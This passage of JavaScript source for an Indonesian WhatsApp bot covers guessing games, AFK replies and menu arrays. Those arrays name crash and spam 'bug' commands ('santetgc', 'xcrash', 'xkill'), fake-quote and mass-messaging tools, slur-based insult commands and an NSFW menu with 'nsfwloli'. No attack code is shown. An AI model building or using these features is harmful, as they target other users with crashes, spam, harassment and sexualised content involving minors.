 if (m.quoted.id == tebakff[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakff[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakff[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Free Fire", tebakff[m.chat][2]) + `\n\nKirim perintah .tebakff\nuntuk bermain lagi 🎮`)
clearTimeout(tebakff[m.chat][3])
delete tebakff[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebakaplikasi[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakaplikasi[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakaplikasi[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakaplikasi[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Aplikasi", tebakaplikasi[m.chat][2]) + `\n\nKirim perintah .tebakaplikasi\nuntuk bermain lagi 🎮`)
clearTimeout(tebakaplikasi[m.chat][3])
delete tebakaplikasi[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebakgambar[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakgambar[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakgambar[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Gambar", tebakgambar[m.chat][2]) + `\n\nKirim perintah .tebakgambar\nuntuk bermain lagi 🎮`)
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebakkata[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkata[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakkata[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Kata", tebakkata[m.chat][2]) + `\n\nKirim perintah .tebakkata\nuntuk bermain lagi 🎮`)
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (asahotak[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == asahotak[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(asahotak[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += asahotak[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Asah Otak", asahotak[m.chat][2]) + `\n\nKirim perintah .asahotak\nuntuk bermain lagi 🎮`)
clearTimeout(asahotak[m.chat][3])
delete asahotak[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (lengkapikalimat[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == lengkapikalimat[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(lengkapikalimat[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += lengkapikalimat[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Lengkapi Kalimat", lengkapikalimat[m.chat][2]) + `\n\nKirim perintah .lengkapikalimat\nuntuk bermain lagi 🎮`)
clearTimeout(lengkapikalimat[m.chat][3])
delete lengkapikalimat[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebakbendera[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakbendera[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
jawaban = json.name.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakbendera[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Bendera", tebakbendera[m.chat][2]) + `\n\nKirim perintah .tebakbendera\nuntuk bermain lagi 🎮`)
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (caklontong[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == caklontong[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += caklontong[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Cak Lontong", caklontong[m.chat][2]) + `\n\nKirim perintah .caklontong\nuntuk bermain lagi 🎮`)
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (susunkata[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == susunkata[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += susunkata[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Susun Kata", susunkata[m.chat][2]) + `\n\nKirim perintah .susunkata\nuntuk bermain lagi 🎮`)
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebakkalimat[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkalimat[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakkalimat[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Kalimat", tebakkalimat[m.chat][2]) + `\n\nKirim perintah .tebakkalimat\nuntuk bermain lagi 🎮`)
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (siapaaku[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == siapaaku[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += siapaaku[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Tebak Siapa", siapaaku[m.chat][2]) + `\n\nKirim perintah .tebaksiapa\nuntuk bermain lagi 🎮`)
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tekateki[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tekateki[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tekateki[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Teka Teki", tekateki[m.chat][2]) + `\n\nKirim perintah .tekateki\nuntuk bermain lagi 🎮`)
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebakkimia[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkimia[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
jawaban = json.unsur.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebakkimia[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Teka Kimia", tebakkimia[m.chat][2]) + `\n\nKirim perintah .tebakkimia\nuntuk bermain lagi 🎮`)
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebaklirik[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebaklirik[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebaklirik[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Teka Lirik", tebaklirik[m.chat][2]) + `\n\nKirim perintah .tebaklirik\nuntuk bermain lagi 🎮`)
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}
if (tebaktebakan[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebaktebakan[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].saldo += tebaktebakan[m.chat][2]
db.data.users[m.sender].rank += await randomNomor(40)
await bales(JwbTrue("Teka Tebakan", tebaktebakan[m.chat][2]) + `\n\nKirim perintah .tebaktebakan\nuntuk bermain lagi 🎮`)
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
else vreden.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
}
}

async function cekgame(gamejid) {
if (tekateki[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tekateki[gamejid][0] })
return true
} else if (caklontong[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: caklontong[gamejid][0] })
return true
} else if (susunkata[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: susunkata[gamejid][0] })
return true
} else if (tebaktebakan[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebaktebakan[gamejid][0] })
return true
} else if (tebaklirik[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebaklirik[gamejid][0] })
return true
} else if (tebakkimia[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakkimia[gamejid][0] })
return true
} else if (siapaaku[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: siapaaku[gamejid][0] })
return true
} else if (tebakkalimat[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakkalimat[gamejid][0] })
return true
} else if (tebakbendera[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakbendera[gamejid][0] })
return true
} else if (tebakkata[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakkata[gamejid][0] })
return true
} else if (asahotak[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: asahotak[gamejid][0] })
return true
} else if (lengkapikalimat[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: lengkapikalimat[gamejid][0] })
return true
} else if (tebakgame[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakgame[gamejid][0] })
return true
} else if (tebakhero[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakhero[gamejid][0] })
return true
} else if (tebakff[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakff[gamejid][0] })
return true
} else if (tebakaplikasi[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakaplikasi[gamejid][0] })
return true
} else if (tebakgambar[gamejid]) {
vreden.sendMessage(gamejid, { text: "Soal ini belum selesai" }, { quoted: tebakgambar[gamejid][0] })
return true
} else {
return false
}
}

 if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
m.reply(`Jangan tag, dia sedang sibuk\n\n*Alasan:* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
vreden.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk\n\n*Alasan :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, m)
}
}

const totalFitur = () =>{
var mytext = fs.readFileSync("./vreden.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}

const cmdRPG = ["mingguan","bulanan","crafting","heal","joinrpg","memancing","repair","adventure","mining","jual","beli","berburu","nebang","berlayar","inventory"]
const cmdPanel = ["addsrv","addusr","listsrv","listusr","addusradmin","restartsrv","stopsrv","startsrv","delusr","delsrv","1gb","2gb","3gb","4gb","5gb","6gb","7gb","8gb","9gb","10gb","11gb","12gb","13gb","14gb","15gb","16gb","17gb","18gb","19gb","20gb","unli"]
const cmdSim = ["panelmenu","rpgmenu","mainmenu","simplemenu","allmenu","groupmenu","gamemenu","storemenu","anonymousmenu","convertmenu","cewekasiamenu","randomquotes","randommenu","searchmenu","downloadmenu","asupanmenu","storagemenu","ownermenu","balancemenu","cowokasiamenu","bugmenu","islammenu","funmenu","stalkingmenu","randomsticker","ephotomenu","nsfwmenu"]
const cmdGrup = ["intro","getnamegc","getname","getppgc","getpp","get","getid","getdeskripsigc","setwelcome","goodbye","welcome","infogrup","afk","pppanjang","linkgrup","delsetleft","setleft","delsetwelcome","autoaigrup","setdesk","setname","setppgc","setppgc2","autodl","antivirtex","antilink2","antilink","antibot","mute","kickme","antitoxic","antilinktt","keamanan","opentime","antiwame2","antiwame","antionce","antidelete","bukajam","tutupjam","delsetopen","setopen","buka","cekasalmember","delsetclose","setclose","tutup","closetime","demote","promote","add","kick","sider","ceksewa","infogrup","delete","hidetag","tagall","revoke","fitnah","fakehidetag","react","quoted"]
const cmdMain = ["bot","price","script","katalog","totalfitur","cekwaktu","aturanbot","donasi","nickname","register","cekdrive","owner","dashboard","infobot","cekpremium","cekbandwidth","listsewa","listpremium","ping","tes","bokep","request","report"]
const cmdDown = ["spotifyplay","spotify","spotifydl","ytmp4","ytmp3","getmusic","getvideo","play","facebook","fb2","igvideo","igphoto","igstory","igvideo2","igphoto2","igstory2","capcut","twitter","tiktok","ttnowm","ttslide","ttget","tiktoksearch","tiktokaudio","ttnowm3","tiktok3","ttnowm2","tiktok2","tiktokaudio3","tiktokaudio2","mediafire","gdrivedl","gitclone"]
const cmdSearch = ["infogempa","spotifysearch","whois","ipwhois","apikey","device","ceksubdo","cekhost","cekdns","sendngl","urlscan","infocuaca","ramalancuaca","jarak","lk21","google","komikusearch","liriklagu","ytsearch","pinterest","pinterest2","gimage"]
const cmdConvert = ["listbahasa","resize","removebg","fast","earrape","deep","blown","bass","slow","robot","reverse","nightcore","fat","smooth","tupai","readvo","toimage","tovideo","tomp4","tourl","toaudio","tovn","translate","sound1 s/d 161","ssweb2","ssweb"]
const cmdGame = ["tebakaplikasi","tebakff","tebakhero","tebakgame","tebakgambar","tebakbendera","family100","lengkapikalimat","asahotak","tebakkata","tebaktebakan","tebaklirik","tebakkimia","tebaksiapa","tebakkalimat","tekateki","caklontong","susunkata","nyerah","bantuan","werewolf","slot","suitpvp","delttc","tictactoe","deltebakbom","tebakbom","delcasino","casino"]
const cmdAi = ["img2img","faceswap","qiooai","simisimi","gpt","ai2","chatgpt2","ai","chatgpt","aiimg","qioo","aidrawing","ai3","bingimage2","bingimage","txt2video","stabledif","diffusion","differentme2","differentme","toanime","aiscene","animediffusion","animediffusion2","animediffusion3","animediffusion4","txt2img","hdr","hd","remini","hdr2","hd2","kompres","hdvid","dehaze","recolor","wink","remini2","texttosound"]
const cmdEph = ["carbon","glitchtext","writetext","advancedglow","typographytext","pixelglitch","neonglitch","flagtext","flag3dtext","deletingtext","blackpinkstyle","glowingtext","underwatertext","logomaker","cartoonstyle","papercutstyle","watercolortext","effectclouds","blackpinklogo","gradienttext","summerbeach","luxurygold","multicoloredneon","sandsummer","galaxywallpaper","1917style","makingneon","royaltext","freecreate","galaxystyle","lighteffects"]
const cmdFun = ["cekkhodam","wangy","kapankah","sangecek","ceksange","gaycek","cekgay","lesbicek","ceklesbi","cantikcek","cekcantik","apakah","bisakah","bagaimanakah","rate","gantengcek","cekganteng","bego","goblok","janda","perawan","babi","tolol","pinter","pintar","asu","bodoh","gay","lesby","bajingan","jancok","anjing","ngentod","ngentot","monyet","mastah","newbie","bangsat","bangke","sange","sangean","dakjal","horny","wibu","puki","peak","pantex","pantek","setan","iblis","cacat","yatim","piatu","masadepan","masadepannya","ceksifat","sifatcek"]
const cmdIslam = ["listsurah","asmaulhusna","kisahnabi","jadwalsholat","randomquran","quranaudio"]
const cmdOwn = ["listsw","getsw","addowner","delowner","jpm","clearram","addprem","delprem","addsewa","delsewa","resetlimit","bcstiker","broadcast","pushkontak","delchat","bcsewa","bcimage","bcvideo","bcaudio","autoblok212","autoread","savefile","gconly","pconly","anticall","autobackup","autorespond","set <option>","settings","setppbot","autobio","prefix","sampah","delsampah","sampah2","delsampah2","blok","unblok","listblok","delcase","addcase","getcase","unbanned","self","autoaijapri","addgamelimit","addlimit","addbalance","kurbalance","listgc","clearallpc","clearallgc","delcmd","setcmd","listpc","join","leavegc","public","banned","listbanned","listblacklist","unblacklist","blacklist","gantifile","addfunction","listcase"]
const cmdStorage = ["addaudio","listaudio","addimage","listimage","addvideo","delvideo","listvideo","addstiker","liststiker"]
const cmdAsupan = ["notnot","kayes","geayubi","bocil","asupan","hijaber","ukhty","santuy","rikagusriani"]
const cmdStiker = ["patrick","doge","popoci","sponsbob","kawan-sponsbob","awoawo","chat","dbfly","dino-kuning","gojosatoru","hope-boy","jisoo","kr-robot","kucing","manusia-lidi","menjamet","meow","nicholas","tyni","qc","qckode","stiker","s","lonte","stickergif","stickerwm","stickergifwm","stikersearch","stikermeme","smeme","emojimix","attp","ttp"]
const cmdStalk = ["igstalk","ffstalk2","mlstalk","ffstalk","ttstalk","getinfogc"]
const cmdRdm = ["couple","ceritahoror","cecan","cosplay","cogan","ppcp","darkjokes","darkjoke","memeindo","meme","waifu","akira","akiyama","ana","asuna","ayuzawa","boruto","chitanda","chitoge","cosplay","deidara","doraemon","elaina","emilia","erza","fanart","gremory","hestia","hinata","husbu","icon","inori","isuzu","itachi","itori","kaga","kagura","kaguya","kakasih","kaneki","kaori","keneki","kosaki","kotori","kuriyama","kuroha","kurumi","loli","madara","mikasa","miku","minato","naruto","natsukawa","nekonime","nezuko","nishimiya","onepiece","pokemon","rem","rize","sagiri","sakura","sasuke","shina","shinka","shizuka","simp","tomori","toukachan","tsunade","yatogami","yuki"]
const cmdQuo = ["galau","quotesanime","quotesdilan","quotesbucin","katasindiran","katahacker","katacinta","katabijak","katailham","katasenja","faktaunik","quotesislamic","motivasi","pantun","puisi","quotes"]
const cmdCwe = ["ryujin","rose","justina","jiso","jeni","thailand","japan","indonesian","korea","vietnam","china"]
const cmdCwo = ["luhan","ohsehun","parkchanyeol","suga","wuyifan","kimjunmyeon","kimminseok","kimnanjoon","kimsoek","kimtaehyung","jhope","jimin","jungkook","kimjondae","kimjong","baekhyung","dohkyungsoo","huangzitao"]
const cmdBal = ["buygamelimit","topglobal","transferlimit","transfergamelimit","buylimit","transfer","limit"]
const cmdNsfw = ["ahegao","ass","bdsm","blowjob","cuckold","cum","eba","ero","femdom","foot","gangbang","gifs","glasses","hentai","jahy","manga","masturbation","milf","neko","neko2","nsfwloli","orgy","panties","pussy","tentacles","thighs","yuri","zettai"]
const cmdAnom = ["menfes","stopmenfess","tolakmenfes","balasmenfes","start","mulai","leave","keluar","anonymouschat","sendprofil","lanjut","next"]
const cmdStore = ["updatelist","addlist","dellist","store","list","setproses","bagi","kali","kurang","tambah","delsetdone","setdone","delsetproses"]
const cmdBug = ["santet","🌷","🐲","🐉","🌵","🎄","🌲","🌳","🌱","🌿","🍀","☘️","bugs","buglink","spams","santetgc2","santetgc"]
const cmdBugHard = ["xvir", "xstik", "xlist", "xbutton", "x24j", "xuia", "xlec", "xforce", "xva", "xta", "xcrash", "xbom", "xbug", "xkill", "xloc", "xdoc", "xhit"]

//didyoumean case (langkah di case)
if (isCmd) {
if ((m.text || m.caption)) {
const code = fs.readFileSync("./vreden.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
    let mean = didyoumean(command, help);
    let sim = similarity(command, mean);
    let similarityPercentage = parseInt(sim * 100);
    if (mean && command.toLowerCase() !== mean.toLowerCase()) {
    m.reply(`*Command Kamu Salah*\n_Mungkin Maksud Anda:_\n\n➠  *${prefix + mean}* (${similarityPercentage}%)\n\n_Ketik ${prefix}allmenu Untuk_\n_Melihat Daftar Fitur_`)
    }
    }
    }
        }
switch(command) {
//▢━━━━━━━━━━━━━━「 GAME COMMAND 」━━━━━━━━━━━━━━▢
case 'tebakgambar': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgambar[m.chat] = [
await vreden.sendMessage(m.chat, { image: { url: result.img }, caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakgambar[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakgambar[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebakgame': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgame[m.chat] = [
await vreden.sendMessage(m.chat, { image: { url: result.img }, caption: `Gambar diatas adalah game?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakgame[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakgame[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebakhero': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://api.vreden.my.id/api/tebakhero')
let result = anu.result
console.log("Jawaban: " + result.jawaban)
tebakhero[m.chat] = [
await vreden.sendMessage(m.chat, { image: { url: result.img }, caption: `Gambar diatas adalah hero?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakhero[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakhero[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebakff': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://api.vreden.my.id/api/tebakff')
let result = anu.result
console.log("Jawaban: " + result.jawaban)
tebakff[m.chat] = [
await vreden.sendMessage(m.chat, { image: { url: result.img }, caption: `Karakter Apa Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakff[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakff[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebakaplikasi': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/vreden/vreden/main/tebakaplikasi.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakaplikasi[m.chat] = [
await vreden.sendMessage(m.chat, { image: { url: result.image }, caption: `Gambar diatas adalah aplikasi?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakaplikasi[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakaplikasi[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebakkata': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkata[m.chat] = [
await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebakkata[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakkata[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'asahotak': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
